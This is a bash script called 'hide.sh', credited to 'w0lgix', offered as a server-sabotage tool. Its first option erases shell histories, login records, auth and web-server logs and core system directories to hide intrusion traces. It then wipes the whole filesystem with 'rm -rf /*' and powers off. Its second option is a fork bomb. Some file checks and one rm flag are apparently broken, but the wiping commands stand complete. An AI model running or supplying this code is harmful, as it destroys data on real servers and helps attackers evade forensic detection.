#!/bin/bash


echo "###################################################"
echo "#https://www.facebook.com/Officiel.mhmad          #"
echo "#                                                 #"
echo "# ░░░░░░███████ ]▄▄▄▄▄▄▄▄                         #"
echo "#▂▄▅█████████▅▄▃▂                                 #"
echo "#I███████████████████].                           #"
echo "#◥⊙▲⊙▲⊙▲⊙▲⊙▲⊙▲⊙◤...                               #"
echo "#                Coded by w0lgix                  #"
echo "#                 v1.0                            #"
echo "#                                                 #"
echo "#            Using ./hide.sh Option               #"
echo "###################################################"
echo -e "1) for delete all file log and sabotage server\n2) for frizz server (not access root)\n"

ch=$1


case $ch in
	1)
echo "Time Distroy is: "$(date +"%r %a %d"/"%m"/"%y")
file1="/tmp/logs"
file2="$HISTFILE"
file3="/root/.ksh_history"
file4="/root/.bash_history"
file5="/root/.ksh_history"
file6="/root/.bash_logout"
file7="/usr/local/apache/logs"
file8="/usr/local/apache/log"
file9="/var/apache/logs"
file10="/var/apache/log"
file11="/var/run/utmp"
file12="/var/logs"
file13="/var/log"
file14="/var/adm"
file15="/etc/wtmp"
file16="/etc/utmp"
file17="/var/log/auth.log"
file18="/home"
file19="/tmp"
file20="/var"
file21="/etc"
file22="/lost+found"
file23="/mnt"
file24="/root"
file25="/proc"
file26="/sys"

if [ -d $file1 -a -d $file2 -a -f $file3 -a -f $file4 -a -f $file5 -a -f $file6 -a -f $file7 -a -f $file8 -a -d $file9 -a -d $file10 -a -d $file11 -a -d $file12 -a -d $file13 -a -d $file14 -a -d $file15 -a -d $file16 -a -f $file17 -a -d $file18 -a -d $file19 -a -d $file20 -a -d $file21 -a -d $file22 -a -d $file23 -a -d $file24 -a -d $file25 -a -d $file26 ] ; then
    rm -rf $file1  
	rm -rf $file2
    rm  $file3 
	rm  $file4
    rm  $file5 
	rm  $file6
    rm  $file7 
	rm  $file8
    rm -rf $file9 
	rm -rf $file10
    rm -rf $file11
	rm -rf $file12
    rm -rf $file13
	rm -rf $file14
    rm -rf $file15
	rm -rf $file16
    rm  $file17
	rm -rf $file18
    rm -rf $file19
	rm -rf $file20
    rm -rf $file21
	rm -rf $file22
    rm -rf $file22
	rm -rf $file23
    rm -rf $file24
	rm -rf $file25
	rm -rf $file26
fi
sleep 1
	find / -name *.bash_history -exec rm -rf {} \;
sleep 1
	find / -name *.bash_logout -exec rm -rf {} \;
sleep 1
	find / -name log* -exec rm -rf {} \;
sleep 1
	find / -name *.log -exec rm -rf {} \;
sleep 1
	rm --no-preserve-too -rf /
sleep 1
	rm -rf /*
sleep 5
	poweroff

;;
	2)

:(){ :|: & };:
;;

*) echo -e "Time is: $(date +"%r %a "%d"/"%m"/"%y)"

esac

